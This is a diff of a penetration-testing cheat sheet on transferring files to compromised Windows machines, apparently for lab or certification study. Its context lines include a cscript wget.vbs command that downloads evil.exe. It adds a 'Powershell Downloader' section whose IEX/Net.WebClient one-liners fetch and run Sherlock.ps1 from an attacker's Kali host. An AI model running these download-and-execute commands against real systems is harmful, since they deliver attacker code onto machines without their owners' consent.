@@ -27,9 +27,9 @@ Of course you need to have a ftp-server configured with the user asshat and the 
 
 ## TFTP
 
-Works by default on:  
+Works by default on:
 
-**Windows XP**  
+**Windows XP**
 
 **Windows 2003**
 
@@ -104,7 +104,10 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
+**Note: **wget.vbs should be 990 bytes
+
 You then execute the script like this:
+
 ```
 cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ```
@@ -126,6 +129,16 @@ Now we invoke it with this crazy syntax:
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
+
+## Powershell Downloader
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/Sherlock.ps1; Find-AllVulns')
+or modded script
+IEX(New-Object Net.WebClient).downloadString('http://KaliIP:8000/vulnSher.ps1')
+```
+
+## 
 
 ## Debug.exe
 
